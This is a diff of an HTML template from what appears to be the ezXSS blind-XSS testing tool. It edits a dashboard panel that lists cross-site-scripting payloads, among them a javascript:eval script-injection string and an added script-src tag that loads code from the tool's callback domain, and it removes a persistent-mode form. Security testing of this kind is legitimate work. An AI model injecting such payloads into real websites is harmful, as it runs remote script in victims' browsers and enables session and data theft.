@@ -29,10 +29,9 @@
                 </div>
 
                 <div class="col-lg-6">
-                    
                     <div class="panel panel-filled">
                         <div class="panel-heading">Payloads</div>
-                        <div class="panel-body" style="padding-bottom:2px">
+                        <div class="panel-body">
                             <div class="form-group">
                                 <label class="control-label">Script src</label>
                                 <input class="form-control" disabled
@@ -51,25 +50,12 @@
 
                                 <label class="control-label">Create Element</label>
                                 <input class="form-control" disabled
-                                    value="javascript:eval('var a=document.createElement(\'script\');a.src=\'//{%data domain}\';document.body.appendChild(a)')">
-                            </div>
-                        </div>
-                    </div>
+                                    value="javascript:eval('var a=document.createElement(\'script\');a.src=\'//{%data domain}\';document.body.appendChild(a)')"><br>
 
-                    <div class="panel panel-filled">
-                        <div class="panel-heading">Persistent mode</div>
-                        <div class="panel-body" style="padding-bottom:0px">
-                            <form class="form" id="persistent" method="post">
-                                <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
-                                <div class="form-group">
-                                    <label class="checkbox-label">
-                                        <input {%checked cPersistent} class="chkbox" id="persistent-mode" name="persistent-mode" type="checkbox">
-                                        <span class="checkbox-custom rectangular"></span>
-                                    </label>
-                                    <p class="checkbox-text">Enable persistent mode [<a href="https://github.com/ssl/ezXSS/wiki" target=_blank>?</a>]</p>
-                                    <button name="persistent" type="submit" class="btn" style="margin-top:-35px;float:right;">Save</button>
-                                </div>
-                            </form>
+                                <label class="control-label">Custom Payload example</label>
+                                <input class="form-control" disabled
+                                    value='&lt;script src=//{%data domain}/custom&gt;&lt;/script&gt;'><br>
+                            </div>
                         </div>
                     </div>
                 </div>
